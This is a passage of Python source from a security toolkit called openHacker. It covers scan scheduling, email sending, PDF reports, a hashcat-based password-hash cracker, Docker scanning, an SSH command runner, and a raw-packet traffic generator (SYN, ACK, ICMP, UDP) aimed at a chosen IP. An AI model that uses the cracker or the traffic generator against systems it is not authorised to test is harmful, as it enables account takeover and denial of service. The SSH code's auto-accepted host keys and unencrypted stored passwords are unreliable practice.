            rows = self.conn.execute("SELECT * FROM clipboard_history ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_docker_scan(self, image: str, vulnerabilities: List[Dict], severity: str,
                        scan_time: float, success: bool):
        try:
            self.conn.execute(
                """INSERT INTO docker_scans (image, vulnerabilities, severity, scan_time, success)
                   VALUES (?, ?, ?, ?, ?)""",
                (image, json.dumps(vulnerabilities), severity, scan_time, success)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save Docker scan: {e}")
    
    def save_cracking_job(self, job_id: str, hash_type: str, hash_value: str, wordlist: str) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO cracking_jobs (job_id, hash_type, hash_value, wordlist, status)
                   VALUES (?, ?, ?, ?, 'pending')""",
                (job_id, hash_type, hash_value, wordlist)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save cracking job: {e}")
            return False
    
    def update_cracking_job(self, job_id: str, status: str, result: str = None, cracked: bool = False):
        try:
            self.conn.execute(
                """UPDATE cracking_jobs 
                   SET status = ?, result = ?, cracked = ?, completed_at = CURRENT_TIMESTAMP 
                   WHERE job_id = ?""",
                (status, result, cracked, job_id)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to update cracking job: {e}")
    
    def get_cracking_jobs(self, status: str = None) -> List[Dict]:
        try:
            if status:
                rows = self.conn.execute("SELECT * FROM cracking_jobs WHERE status = ? ORDER BY started_at DESC", (status,))
            else:
                rows = self.conn.execute("SELECT * FROM cracking_jobs ORDER BY started_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def log_platform_command(self, platform: str, command: str, user_id: str = None):
        try:
            self.conn.execute(
                "INSERT INTO platform_commands (platform, command, user_id) VALUES (?, ?, ?)",
                (platform, command, user_id)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log platform command: {e}")
    
    def get_platform_commands(self, platform: str = None, limit: int = 50) -> List[Dict]:
        try:
            if platform:
                rows = self.conn.execute(
                    "SELECT * FROM platform_commands WHERE platform = ? ORDER BY timestamp DESC LIMIT ?",
                    (platform, limit)
                )
            else:
                rows = self.conn.execute(
                    "SELECT * FROM platform_commands ORDER BY timestamp DESC LIMIT ?",
                    (limit,)
                )
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_email(self, email_msg: 'EmailMessage') -> bool:
        try:
            self.conn.execute(
                """INSERT INTO email_messages 
                   (to_address, subject, body, from_address, html, attachments, status, sent_at)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                (email_msg.to, email_msg.subject, email_msg.body, email_msg.from_email,
                 1 if email_msg.html else 0, json.dumps(email_msg.attachments),
                 email_msg.status, email_msg.sent_at)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save email: {e}")
            return False
    
    def get_emails(self, status: str = None, limit: int = 50) -> List[Dict]:
        try:
            if status:
                rows = self.conn.execute(
                    "SELECT * FROM email_messages WHERE status = ? ORDER BY created_at DESC LIMIT ?",
                    (status, limit)
                )
            else:
                rows = self.conn.execute(
                    "SELECT * FROM email_messages ORDER BY created_at DESC LIMIT ?",
                    (limit,)
                )
            emails = []
            for row in rows:
                email = dict(row)
                email['attachments'] = json.loads(email['attachments']) if email['attachments'] else []
                emails.append(email)
            return emails
        except Exception as e:
            print(f"Failed to get emails: {e}")
            return []
    
    def update_email_status(self, email_id: int, status: str):
        try:
            self.conn.execute(
                "UPDATE email_messages SET status = ?, sent_at = CURRENT_TIMESTAMP WHERE id = ?",
                (status, email_id)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to update email status: {e}")
    
    def save_pdf_report(self, report: 'PDFReport') -> bool:
        try:
            self.conn.execute(
                """INSERT INTO pdf_reports 
                   (title, target, analysis, file_path, status)
                   VALUES (?, ?, ?, ?, ?)""",
                (report.title, report.target, json.dumps(report.analysis),
                 report.file_path, report.status)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save PDF report: {e}")
            return False
    
    def get_pdf_reports(self, limit: int = 20) -> List[Dict]:
        try:
            rows = self.conn.execute(
                "SELECT * FROM pdf_reports ORDER BY created_at DESC LIMIT ?",
                (limit,)
            )
            reports = []
            for row in rows:
                report = dict(row)
                report['analysis'] = json.loads(report['analysis']) if report['analysis'] else {}
                reports.append(report)
            return reports
        except Exception as e:
            print(f"Failed to get PDF reports: {e}")
            return []
    
    def add_threat_monitor(self, target: str, scan_type: str, interval: int = 300) -> bool:
        try:
            next_scan = datetime.datetime.now() + datetime.timedelta(seconds=interval)
            self.conn.execute(
                """INSERT INTO threat_monitors (target, scan_type, interval, enabled, next_scan)
                   VALUES (?, ?, ?, 1, ?)""",
                (target, scan_type, interval, next_scan.isoformat())
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add threat monitor: {e}")
            return False
    
    def get_threat_monitors(self, enabled_only: bool = True) -> List[Dict]:
        try:
            if enabled_only:
                rows = self.conn.execute("SELECT * FROM threat_monitors WHERE enabled = 1 ORDER BY created_at DESC")
            else:
                rows = self.conn.execute("SELECT * FROM threat_monitors ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def update_threat_monitor_scan(self, monitor_id: int):
        try:
            monitor = self.conn.execute(
                "SELECT interval FROM threat_monitors WHERE id = ?", (monitor_id,)
            ).fetchone()
            if monitor:
                next_scan = datetime.datetime.now() + datetime.timedelta(seconds=monitor['interval'])
                self.conn.execute(
                    "UPDATE threat_monitors SET last_scan = CURRENT_TIMESTAMP, next_scan = ? WHERE id = ?",
                    (next_scan.isoformat(), monitor_id)
                )
                self.conn.commit()
        except Exception as e:
            print(f"Failed to update threat monitor: {e}")
    
    def log_threat_monitor_result(self, monitor_id: int, target: str, scan_type: str,
                                 threats_found: int, severity: str, output: str):
        try:
            self.conn.execute(
                """INSERT INTO threat_monitor_results 
                   (monitor_id, target, scan_type, threats_found, severity, output)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (monitor_id, target, scan_type, threats_found, severity, output[:5000])
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log threat monitor result: {e}")
    
    def close(self):
        try:
            self.conn.close()
        except:
            pass

# =====================
# THREAT MONITOR ENGINE
# =====================
class ThreatMonitorEngine:
    """Automated threat monitoring and scanning engine"""
    
    def __init__(self, db: DatabaseManager, config: ConfigManager, 
                 network_tools, pdf_report, email_composer):
        self.db = db
        self.config = config
        self.tools = network_tools
        self.pdf_report = pdf_report
        self.email_composer = email_composer
        self.running = False
        self.monitor_thread = None
        self.report_thread = None
        self.last_report_time = None
        self.scan_results = {}
    
    def start(self):
        """Start the threat monitoring engine"""
        if self.running:
            return
        
        self.running = True
        self.monitor_thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self.monitor_thread.start()
        
        if self.config.get('threat_monitor.report_enabled', True):
            self.report_thread = threading.Thread(target=self._report_loop, daemon=True)
            self.report_thread.start()
        
        print(f"{Colors.SUCCESS}✅ Threat monitoring engine started{Colors.RESET}")
    
    def stop(self):
        """Stop the threat monitoring engine"""
        self.running = False
        print(f"{Colors.WARNING}⏹️ Threat monitoring engine stopped{Colors.RESET}")
    
    def add_monitor(self, target: str, scan_type: str = "quick", interval: int = 300) -> bool:
        """Add a new target to monitor"""
        return self.db.add_threat_monitor(target, scan_type, interval)
    
    def _monitor_loop(self):
        """Main monitoring loop"""
        while self.running:
            try:
                monitors = self.db.get_threat_monitors(enabled_only=True)
                now = datetime.datetime.now()
                
                for monitor in monitors:
                    try:
                        next_scan = datetime.datetime.fromisoformat(monitor['next_scan']) if monitor.get('next_scan') else now
                        if now >= next_scan:
                            self._run_monitor_scan(monitor)
                            self.db.update_threat_monitor_scan(monitor['id'])
                    except Exception as e:
                        logger.error(f"Monitor {monitor.get('id')} error: {e}")
                
                time.sleep(10)
            except Exception as e:
                logger.error(f"Monitor loop error: {e}")
                time.sleep(30)
    
    def _run_monitor_scan(self, monitor: Dict):
        """Run a scan for a specific monitor"""
        target = monitor['target']
        scan_type = monitor['scan_type']
        monitor_id = monitor['id']
        
        logger.info(f"Running {scan_type} scan on {target}")
        
        try:
            if scan_type == "quick":
                result = self.tools.nmap(target, "quick")
            elif scan_type == "full":
                result = self.tools.nmap(target, "full")
            elif scan_type == "vuln":
                result = self.tools.nmap(target, "vulnerability")
            elif scan_type == "ping":
                result = self.tools.ping(target, 2)
            else:
                result = self.tools.nmap(target, "quick")
            
            threats_found = 0
            severity = "low"
            
            if result.success and result.output:
                if 'open' in result.output.lower():
                    threats_found = result.output.lower().count('open')
                    severity = "medium" if threats_found > 3 else "low"
                if 'vulnerability' in result.output.lower() or 'cve' in result.output.lower():
                    severity = "high"
                    threats_found += 1
            
            if threats_found > 0:
                self.db.log_threat(
                    f"monitor_{scan_type}",
                    target,
                    severity,
                    f"Scan found {threats_found} potential issues"
                )
            
            self.db.log_threat_monitor_result(
                monitor_id, target, scan_type, threats_found, severity, result.output[:2000] if result.output else ""
            )
            
            self.scan_results[monitor_id] = {
                'timestamp': datetime.datetime.now().isoformat(),
                'target': target,
                'scan_type': scan_type,
                'threats_found': threats_found,
                'severity': severity,
                'output': result.output[:5000] if result.output else ""
            }
            
        except Exception as e:
            logger.error(f"Monitor scan error: {e}")
    
    def _report_loop(self):
        """Periodically generate reports"""
        report_interval = self.config.get('threat_monitor.report_interval', 3600)
        time.sleep(60)
        
        while self.running:
            try:
                now = datetime.datetime.now()
                if self.last_report_time is None or (now - self.last_report_time).seconds >= report_interval:
                    self._generate_report()
                    self.last_report_time = now
                time.sleep(60)
            except Exception as e:
                logger.error(f"Report loop error: {e}")
                time.sleep(60)
    
    def _generate_report(self):
        """Generate a PDF threat report"""
        if not self.pdf_report:
            return
        
        try:
            monitors = self.db.get_threat_monitors(enabled_only=False)
            threats = self.db.get_recent_threats(50)
            
            analysis = {
                'generated_at': datetime.datetime.now().isoformat(),
                'monitors_count': len(monitors),
                'active_monitors': [m for m in monitors if m.get('enabled')],
                'recent_threats': threats[:20],
                'total_threats': len(threats),
                'scan_results': list(self.scan_results.values())[-10:],
                'recommendations': [
                    "Review all open ports and close unnecessary services",
                    "Update all software to latest versions",
                    "Implement network segmentation",
                    "Enable logging and monitoring on all critical systems"
                ]
            }
            
            result = self.pdf_report.generate_report(
                f"Threat Monitor Report - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}",
                "Multiple Targets",
                analysis
            )
            
            if result.get('success'):
                logger.info(f"Threat report generated: {result.get('file_path')}")
            else:
                logger.error(f"Threat report generation failed: {result.get('error')}")
                
        except Exception as e:
            logger.error(f"Report generation error: {e}")
    
    def get_status(self) -> Dict:
        """Get current monitoring status"""
        monitors = self.db.get_threat_monitors(enabled_only=False)
        return {
            'running': self.running,
            'monitors_count': len(monitors),
            'active_monitors': len([m for m in monitors if m.get('enabled')]),
            'last_report': self.last_report_time.isoformat() if self.last_report_time else None,
            'scan_results_count': len(self.scan_results)
        }

# =====================
# EMAIL COMPOSER ENGINE
# =====================
class EmailComposerEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.smtp_server = config.get('email.smtp_server', '')
        self.smtp_port = config.get('email.smtp_port', 587)
        self.smtp_username = config.get('email.smtp_username', '')
        self.smtp_password = config.get('email.smtp_password', '')
        self.from_email = config.get('email.from_email', '')
        self.tls = config.get('email.tls', True)
    
    def compose_email(self, to: str, subject: str, body: str, 
                      from_email: str = None, html: bool = False,
                      attachments: List[str] = None) -> EmailMessage:
        email_msg = EmailMessage(
            to=to,
            subject=subject,
            body=body,
            from_email=from_email or self.from_email,
            attachments=attachments or [],
            html=html,
            status="draft"
        )
        self.db.save_email(email_msg)
        return email_msg
    
    def send_email(self, email_id: int) -> Dict[str, Any]:
        emails = self.db.get_emails(limit=100)
        email_data = next((e for e in emails if e['id'] == email_id), None)
        
        if not email_data:
            return {'success': False, 'error': f'Email {email_id} not found'}
        
        if email_data['status'] == 'sent':
            return {'success': False, 'error': 'Email already sent'}
        
        if not self.smtp_server or not self.smtp_username or not self.smtp_password:
            return {'success': False, 'error': 'SMTP server not configured'}
        
        try:
            msg = MIMEMultipart()
            msg['From'] = email_data['from_address']
            msg['To'] = email_data['to_address']
            msg['Subject'] = email_data['subject']
            
            if email_data['html']:
                msg.attach(MIMEText(email_data['body'], 'html'))
            else:
                msg.attach(MIMEText(email_data['body'], 'plain'))
            
            attachments = json.loads(email_data['attachments']) if email_data['attachments'] else []
            for attachment_path in attachments:
                if os.path.exists(attachment_path):
                    with open(attachment_path, 'rb') as f:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(f.read())
                        encoders.encode_base64(part)
                        part.add_header(
                            'Content-Disposition',
                            f'attachment; filename={os.path.basename(attachment_path)}'
                        )
                        msg.attach(part)
            
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                if self.tls:
                    server.starttls()
                server.login(self.smtp_username, self.smtp_password)
                server.send_message(msg)
            
            self.db.update_email_status(email_id, 'sent')
            
            return {
                'success': True,
                'message': f'Email sent to {email_data["to_address"]}',
                'email_id': email_id
            }
            
        except Exception as e:
            self.db.update_email_status(email_id, 'failed')
            return {'success': False, 'error': str(e)}
    
    def get_emails(self, status: str = None, limit: int = 50) -> List[Dict]:
        return self.db.get_emails(status, limit)
    
    def delete_email(self, email_id: int) -> bool:
        try:
            self.db.conn.execute("DELETE FROM email_messages WHERE id = ?", (email_id,))
            self.db.conn.commit()
            return True
        except:
            return False

# =====================
# PDF REPORT GENERATOR
# =====================
class PDFReportGenerator:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.pdf_available = PDF_AVAILABLE
    
    def generate_report(self, title: str, target: str, analysis: Dict) -> Dict[str, Any]:
        if not self.pdf_available:
            return {'success': False, 'error': 'PDF generation not available (reportlab missing)'}
        
        try:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"openhacker_report_{target.replace('/', '_').replace(':', '_')}_{timestamp}.pdf"
            filepath = os.path.join(PDF_REPORTS_DIR, filename)
            
            doc = SimpleDocTemplate(
                filepath,
                pagesize=A4,
                rightMargin=72,
                leftMargin=72,
                topMargin=72,
                bottomMargin=72
            )
            
            styles = getSampleStyleSheet()
            title_style = ParagraphStyle(
                'CustomTitle',
                parent=styles['Heading1'],
                fontSize=24,
                textColor=colors.black,
                alignment=0,
                spaceAfter=30
            )
            
            story = []
            
            # Header
            story.append(Paragraph(f"openHacker Security Report", title_style))
            story.append(Spacer(1, 12))
            
            # Metadata table
            metadata = [
                ['Title:', title],
                ['Target:', target],
                ['Generated:', datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')],
                ['Tool:', f"openHacker v{VERSION}"],
                ['Author:', AUTHOR]
            ]
            
            meta_table = Table(metadata, colWidths=[100, 400])
            meta_table.setStyle(TableStyle([
                ('FONTNAME', (0, 0), (-1, -1), 'Courier'),
                ('FONTSIZE', (0, 0), (-1, -1), 10),
                ('TEXTCOLOR', (0, 0), (0, -1), colors.grey),
                ('TEXTCOLOR', (1, 0), (1, -1), colors.black),
                ('BOTTOMPADDING', (0, 0), (-1, -1), 8),
            ]))
            story.append(meta_table)
            story.append(Spacer(1, 20))
            
            # Executive Summary
            story.append(Paragraph("Executive Summary", styles['Heading2']))
            summary = f"""This report presents a comprehensive security analysis of <b>{target}</b>. 
            The assessment was performed using openHacker's automated scanning and threat monitoring capabilities.
            The findings below highlight potential security issues and provide recommendations for remediation."""
            story.append(Paragraph(summary, styles['Normal']))
            story.append(Spacer(1, 15))
            
            # Analysis Sections
            for key, value in analysis.items():
                if isinstance(value, dict):
                    story.append(Paragraph(key.replace('_', ' ').title(), styles['Heading3']))
                    for sub_key, sub_value in value.items():
                        if not isinstance(sub_value, (dict, list)):
                            story.append(Paragraph(f"• {sub_key.replace('_', ' ').title()}: {sub_value}", styles['Normal']))
                    story.append(Spacer(1, 10))
                elif isinstance(value, list):
                    story.append(Paragraph(key.replace('_', ' ').title(), styles['Heading3']))
                    for item in value[:20]:
                        if isinstance(item, dict):
                            item_text = ', '.join([f"{k}: {v}" for k, v in item.items() if not isinstance(v, (dict, list))])
                            story.append(Paragraph(f"• {item_text}", styles['Normal']))
                        else:
                            story.append(Paragraph(f"• {item}", styles['Normal']))
                    story.append(Spacer(1, 10))
                else:
                    story.append(Paragraph(f"{key.replace('_', ' ').title()}: {value}", styles['Normal']))
            
            # Recommendations
            if 'recommendations' in analysis:
                story.append(Paragraph("Recommendations", styles['Heading2']))
                for rec in analysis['recommendations']:
                    story.append(Paragraph(f"• {rec}", styles['Normal']))
                story.append(Spacer(1, 15))
            
            # Footer
            story.append(Spacer(1, 30))
            story.append(Paragraph(
                f"Report generated by openHacker v{VERSION} | {AUTHOR} | {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                styles['Italic']
            ))
            
            doc.build(story)
            
            report = PDFReport(
                title=title,
                target=target,
                analysis=analysis,
                timestamp=datetime.datetime.now().isoformat(),
                file_path=filepath,
                status="generated"
            )
            self.db.save_pdf_report(report)
            
            return {
                'success': True,
                'file_path': filepath,
                'message': f'PDF report generated: {filename}'
            }
            
        except Exception as e:
            logger.error(f"PDF generation error: {e}")
            return {'success': False, 'error': str(e)}
    
    def get_reports(self, limit: int = 20) -> List[Dict]:
        return self.db.get_pdf_reports(limit)

# =====================
# CRACKING ENGINE
# =====================
class CrackingEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running_jobs = {}
        self.hashcat_path = config.get('cracking.hashcat_path', 'hashcat')
        self.wordlist_path = config.get('cracking.wordlist_path', '/usr/share/wordlists/rockyou.txt')
        self.default_hash_type = config.get('cracking.default_hash_type', 0)
    
    def crack_hash(self, hash_type: str, hash_value: str, wordlist: str = None) -> str:
        job_id = str(uuid.uuid4())[:8]
        wordlist = wordlist or self.wordlist_path
        
        self.db.save_cracking_job(job_id, hash_type, hash_value, wordlist)
        
        thread = threading.Thread(target=self._run_hashcat, args=(job_id, hash_type, hash_value, wordlist))
        thread.daemon = True
        thread.start()
        
        return job_id
    
    def _run_hashcat(self, job_id: str, hash_type: str, hash_value: str, wordlist: str):
        self.db.update_cracking_job(job_id, 'running')
        
        try:
            hash_type_num = self._get_hash_type_num(hash_type)
            
            if not shutil.which(self.hashcat_path):
                result = self._crack_with_python(hash_type, hash_value, wordlist)
                if result:
                    self.db.update_cracking_job(job_id, 'completed', result, True)
                else:
                    self.db.update_cracking_job(job_id, 'failed', 'No match found', False)
                return
            
            cmd = [
                self.hashcat_path,
                '-m', str(hash_type_num),
                '-a', '0',
                '-o', os.path.join(CRACKING_DIR, f"{job_id}_result.txt"),
                '--potfile-path', os.path.join(CRACKING_DIR, f"{job_id}.pot"),
                hash_value,
                wordlist
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            result_file = os.path.join(CRACKING_DIR, f"{job_id}_result.txt")
            if os.path.exists(result_file):
                with open(result_file, 'r') as f:
                    content = f.read().strip()
                    if ':' in content:
                        cracked = content.split(':', 1)[1]
                        self.db.update_cracking_job(job_id, 'completed', cracked, True)
                    else:
                        self.db.update_cracking_job(job_id, 'completed', content, True)
            else:
                self.db.update_cracking_job(job_id, 'failed', 'No result found', False)
                
        except subprocess.TimeoutExpired:
            self.db.update_cracking_job(job_id, 'failed', 'Timeout', False)
        except Exception as e:
            self.db.update_cracking_job(job_id, 'failed', str(e), False)
    
    def _get_hash_type_num(self, hash_type: str) -> int:
        hash_types = {
            'md5': 0, 'sha1': 100, 'sha256': 1400, 'sha512': 1700,
            'ntlm': 1000, 'mysql': 200, 'mysql5': 300, 'postgres': 12,
            'mssql': 131, 'oracle': 3100, 'bcrypt': 3200, 'scrypt': 8900,
            'md5_utf8': 10, 'sha1_utf8': 110, 'sha256_utf8': 1410, 'sha512_utf8': 1710
        }
        return hash_types.get(hash_type.lower(), self.default_hash_type)
    
    def _crack_with_python(self, hash_type: str, hash_value: str, wordlist: str) -> Optional[str]:
        try:
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                for word in f:
                    word = word.strip()
                    if not word:
                        continue
                    
                    if hash_type.lower() == 'md5':
                        if hashlib.md5(word.encode()).hexdigest() == hash_value:
                            return word
                    elif hash_type.lower() == 'sha1':
                        if hashlib.sha1(word.encode()).hexdigest() == hash_value:
                            return word
                    elif hash_type.lower() == 'sha256':
                        if hashlib.sha256(word.encode()).hexdigest() == hash_value:
                            return word
                    elif hash_type.lower() == 'sha512':
                        if hashlib.sha512(word.encode()).hexdigest() == hash_value:
                            return word
            return None
        except:
            return None
    
    def get_job_status(self, job_id: str) -> Optional[Dict]:
        jobs = self.db.get_cracking_jobs()
        for job in jobs:
            if job['job_id'] == job_id:
                return dict(job)
        return None
    
    def get_all_jobs(self) -> List[Dict]:
        return self.db.get_cracking_jobs()

# =====================
# DOCKER SCANNER
# =====================
class DockerScanner:
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def scan_image(self, image: str) -> Dict:
        start_time = time.time()
        try:
            result = subprocess.run(['docker', 'scan', image], capture_output=True, text=True, timeout=300)
            scan_time = time.time() - start_time
            
            vulnerabilities = self._parse_vulnerabilities(result.stdout)
            severity = self._determine_severity(vulnerabilities)
            
            self.db.save_docker_scan(image, vulnerabilities, severity, scan_time, result.returncode == 0)
            
            return {
                'success': result.returncode == 0,
                'image': image,
                'vulnerabilities': vulnerabilities,
                'severity': severity,
                'scan_time': scan_time,
                'output': result.stdout[:2000]
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Scan timed out', 'image': image}
        except Exception as e:
            return {'success': False, 'error': str(e), 'image': image}
    
    def _parse_vulnerabilities(self, output: str) -> List[Dict]:
        vulns = []
        for line in output.split('\n'):
            if 'HIGH' in line or 'CRITICAL' in line or 'MEDIUM' in line or 'LOW' in line:
                severity = 'critical' if 'CRITICAL' in line else 'high' if 'HIGH' in line else 'medium' if 'MEDIUM' in line else 'low'
                vulns.append({'severity': severity, 'description': line.strip()})
        return vulns
    
    def _determine_severity(self, vulnerabilities: List[Dict]) -> str:
        if any(v.get('severity') == 'critical' for v in vulnerabilities):
            return 'critical'
        if any(v.get('severity') == 'high' for v in vulnerabilities):
            return 'high'
        if vulnerabilities:
            return 'medium'
        return 'low'
    
    def docker_info(self) -> Dict:
        result = subprocess.run(['docker', 'info'], capture_output=True, text=True, timeout=30)
        return {'success': result.returncode == 0, 'output': result.stdout}
    
    def docker_ps(self) -> Dict:
        result = subprocess.run(['docker', 'ps'], capture_output=True, text=True, timeout=30)
        return {'success': result.returncode == 0, 'output': result.stdout}
    
    def docker_images(self) -> Dict:
        result = subprocess.run(['docker', 'images'], capture_output=True, text=True, timeout=30)
        return {'success': result.returncode == 0, 'output': result.stdout}
    
    def docker_bench(self) -> Dict:
        result = subprocess.run(
            ['docker', 'run', '--rm', '--net', 'host', '--pid', 'host',
             '--cap-add', 'audit_control', '-v', '/var/lib:/var/lib',
             '-v', '/var/run/docker.sock:/var/run/docker.sock',
             '-v', '/etc:/etc', '-v', '/usr/lib/systemd:/usr/lib/systemd',
             'docker/docker-bench-security'],
            capture_output=True, text=True, timeout=300
        )
        return {'success': result.returncode == 0, 'output': result.stdout}

# =====================
# SSH MANAGER
# =====================
class SSHManager:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.connections: Dict[str, paramiko.SSHClient] = {}
    
    def is_available(self) -> bool:
        return PARAMIKO_AVAILABLE
    
    def add_connection(self, name: str, host: str, username: str,
                      password: str = None, key_path: str = None,
                      port: int = 22) -> SSHConnection:
        conn_id = str(uuid.uuid4())[:8]
        conn = SSHConnection(
            id=conn_id,
            name=name,
            host=host,
            port=port,
            username=username,
            password=password,
            key_path=key_path,
            created_at=datetime.datetime.now().isoformat()
        )
        self.db.add_ssh_connection(conn)
        return conn
    
    def connect(self, conn_id: str) -> bool:
        if not self.is_available():
            return False
        
        rows = self.db.get_ssh_connections()
        conn_data = next((c for c in rows if c['id'] == conn_id), None)
        if not conn_data:
            return False
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            connect_kwargs = {
                'hostname': conn_data['host'],
                'port': conn_data['port'],
                'username': conn_data['username'],
                'timeout': 30
            }
            
            if conn_data['password_encrypted']:
                connect_kwargs['password'] = conn_data['password_encrypted']
            elif conn_data['key_path'] and os.path.exists(conn_data['key_path']):
                connect_kwargs['key_filename'] = conn_data['key_path']
            
            client.connect(**connect_kwargs)
            self.connections[conn_id] = client
            
            self.db.conn.execute(
                "UPDATE ssh_connections SET status = 'connected', last_used = CURRENT_TIMESTAMP WHERE id = ?",
                (conn_id,)
            )
            self.db.conn.commit()
            return True
        except Exception as e:
            print(f"SSH connection error: {e}")
            return False
    
    def disconnect(self, conn_id: str):
        if conn_id in self.connections:
            try:
                self.connections[conn_id].close()
                del self.connections[conn_id]
            except:
                pass
        
        self.db.conn.execute(
            "UPDATE ssh_connections SET status = 'disconnected' WHERE id = ?",
            (conn_id,)
        )
        self.db.conn.commit()
    
    def execute_command(self, conn_id: str, command: str, timeout: int = 30) -> CommandResult:
        start_time = time.time()
        
        if conn_id not in self.connections:
            if not self.connect(conn_id):
                return CommandResult(False, "", 0, "Not connected")
        
        client = self.connections[conn_id]
        
        try:
            stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            exit_code = stdout.channel.recv_exit_status()
            
            execution_time = time.time() - start_time
            
            self.db.log_ssh_command(conn_id, command, output, exit_code, execution_time)
            
            return CommandResult(
                success=exit_code == 0,
                output=output + ("\n" + error if error else ""),
                execution_time=execution_time,
                error=None if exit_code == 0 else error
            )
        except Exception as e:
            execution_time = time.time() - start_time
            return CommandResult(False, "", execution_time, str(e))
    
    def get_connections(self) -> List[Dict]:
        rows = self.db.get_ssh_connections()
        for row in rows:
            row['connected'] = row['id'] in self.connections
        return rows

# =====================
# TRAFFIC GENERATOR ENGINE
# =====================
class TrafficGeneratorEngine:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.active_generators: Dict[str, TrafficGenerator] = {}
        self.stop_events: Dict[str, threading.Event] = {}
    
    def get_available_types(self) -> List[str]:
        types = [t.value for t in TrafficType]
        return types
    
    def generate(self, traffic_type: str, target_ip: str, duration: int,
                port: int = None, packet_rate: int = 100) -> TrafficGenerator:
        try:
            ipaddress.ip_address(target_ip)
        except:
            raise ValueError(f"Invalid IP: {target_ip}")
        
        if port is None:
            port_map = {
                'http_get': 80, 'http_post': 80, 'https': 443,
                'dns': 53, 'tcp_syn': 80, 'tcp_connect': 80, 'udp': 53
            }
            port = port_map.get(traffic_type, 0)
        
        generator_id = f"{target_ip}_{traffic_type}_{int(time.time())}"
        
        generator = TrafficGenerator(
            id=generator_id,
            traffic_type=traffic_type,
            target_ip=target_ip,
            target_port=port,
            duration=duration,
            start_time=datetime.datetime.now().isoformat(),
            status="running"
        )
        
        stop_event = threading.Event()
        self.stop_events[generator_id] = stop_event
        
        thread = threading.Thread(
            target=self._run_generator,
            args=(generator, packet_rate, stop_event),
            daemon=True
        )
        thread.start()
        
        self.active_generators[generator_id] = generator
        return generator
    
    def _run_generator(self, generator: TrafficGenerator, packet_rate: int,
                      stop_event: threading.Event):
        start_time = time.time()
        end_time = start_time + generator.duration
        packets_sent = 0
        bytes_sent = 0
        interval = 1.0 / max(1, packet_rate)
        
        func = self._get_generator_func(generator.traffic_type)
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                size = func(generator.target_ip, generator.target_port)
                if size > 0:
                    packets_sent += 1
                    bytes_sent += size
                time.sleep(interval)
            except Exception as e:
                time.sleep(0.1)
        
        generator.packets_sent = packets_sent
        generator.bytes_sent = bytes_sent
        generator.end_time = datetime.datetime.now().isoformat()
        generator.status = "completed" if not stop_event.is_set() else "stopped"
        
        self.db.log_traffic(generator)
    
    def _get_generator_func(self, traffic_type: str):
        funcs = {
            'icmp': self._icmp,
            'tcp_syn': self._tcp_syn,
            'tcp_ack': self._tcp_ack,
            'tcp_connect': self._tcp_connect,
            'udp': self._udp,
            'http_get': self._http_get,
            'http_post': self._http_post,
            'https': self._https,
            'dns': self._dns,
            'arp': self._arp,
            'mixed': self._mixed,
            'random': self._random
        }
        return funcs.get(traffic_type, self._icmp)
    
    def _icmp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            else:
                subprocess.run(['ping', '-c', '1', '-W', '1', target],
                              capture_output=True, timeout=2)
                return 64
        except:
            return 0
    
    def _tcp_syn(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="S")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_ack(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="A")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_connect(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target, port))
            sock.close()
            return 40 if result == 0 else 0
        except:
            return 0
    
    def _udp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/UDP(dport=port)/b"OPENHACKER"
                send(packet, verbose=False)
                return len(packet)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b"OPENHACKER", (target, port))
                sock.close()
                return 64
        except:
            return 0
    
